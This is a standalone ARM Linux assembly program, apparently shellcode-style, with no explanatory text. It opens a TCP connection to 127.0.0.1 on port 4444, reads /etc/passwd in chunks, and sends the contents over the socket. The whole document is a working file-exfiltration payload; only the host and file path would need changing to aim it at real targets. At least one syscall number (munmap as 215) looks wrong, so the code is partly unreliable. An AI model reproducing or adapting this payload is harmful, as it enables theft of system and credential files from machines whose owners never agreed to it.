.section .text
.global _start
_start:
    .ARM
    .code 32

    /* 1. Create socket */
    mov r0, #2          /* AF_INET */
    mov r1, #1          /* SOCK_STREAM */
    mov r2, #0          /* IPPROTO_IP */
    movw r7, #281       /* socket() */
    svc #0
    cmp r0, #0          /* Check if socket creation failed */
    ble error_exit
    mov r4, r0          /* Save socket fd in r4 */

    /* 2. Connect to server */
    adr r1, sockaddr    /* sockaddr struct */
    mov r2, #16         /* addrlen */
    movw r7, #283       /* connect() */
    svc #0
    cmp r0, #0          /* Check connection success */
    bne error_exit

    /* 3. Allocate buffer for read/write using mmap */
    @ Preserve r4 (socket fd) by pushing it to stack
    push {r4}           @ Save r4 before using it as mmap argument

    mov r0, #0          /* addr (let kernel choose) */
    mov r1, #256        /* len (buffer size) */
    mov r2, #3          /* PROT_READ | PROT_WRITE */
    mov r3, #0x22       /* MAP_PRIVATE | MAP_ANONYMOUS */
    mov r4, #-1         /* fd (now r4 correctly holds -1 for mmap's fd argument) */
    mov r5, #0          /* offset */
    movw r7, #192       /* mmap() or mmap2() - usually mmap2 on ARM */
    svc #0
    cmp r0, #0          /* Check if mmap failed (might return 0 on success if addr was 0) */
    blt error_exit      /* Check for negative return value (error) */
    mov r8, r0          /* Save buffer address in r8 */

    @ Restore r4 (socket fd) from stack
    pop {r4}            @ Restore r4, it now holds the socket FD (3) again

    /* 4. Open file */
    adr r0, filename
    mov r1, #0          /* O_RDONLY */
    mov r2, #0          /* mode */
    mov r7, #5          /* open() */
    svc #0
    cmp r0, #0          /* Check file opened successfully */
    ble error_exit
    mov r5, r0          /* Save file fd */

file_read_loop:
    /* 5. Read file chunk */
    mov r0, r5          /* file fd */
    mov r1, r8          /* buffer address (now from mmap) */
    mov r2, #255        /* chunk size */
    mov r7, #3          /* read() */
    svc #0
    cmp r0, #0          /* Check read result */
    ble file_done       /* 0=EOF, negative=error */
    mov r6, r0          /* bytes read */

    /* 6. Send data */
    mov r0, r4          /* socket fd (r4 now correctly holds 3) */
    mov r1, r8          /* buffer address */
    mov r2, r6          /* bytes to send */
    mov r7, #4          /* write() */
    svc #0
    cmp r0, r6          /* Check all bytes sent */
    bne error_exit

    /* 7. Continue loop */
    b file_read_loop

file_done:
    /* 8. Clean up file fd */
    mov r0, r5          /* file fd */
    mov r7, #6          /* close() */
    svc #0

    /* 9. Clean up socket fd */
    mov r0, r4          /* socket fd */
    mov r7, #6          /* close() */
    svc #0

    /* 10. Clean up mmap'd buffer */
    mov r0, r8          /* buffer address */
    mov r1, #256        /* len (same as mmap) */
    movw r7, #215       /* munmap() */
    svc #0

    /* Exit successfully */
    mov r0, #0          /* status */
    mov r7, #1          /* exit() */
    svc #0

error_exit:
    /* Error exit with status 1 */
    mov r0, #1
    mov r7, #1
    svc #0

sockaddr:
    .byte 0x02, 0x00    /* AF_INET */
    .byte 0x11, 0x5c    /* port 4444 */
    .byte 0x7f, 0x00, 0x00, 0x01  /* 127.0.0.1 */
    .byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

filename:
    .asciz "/etc/passwd"  /* Absolute path recommended */
    .byte 0
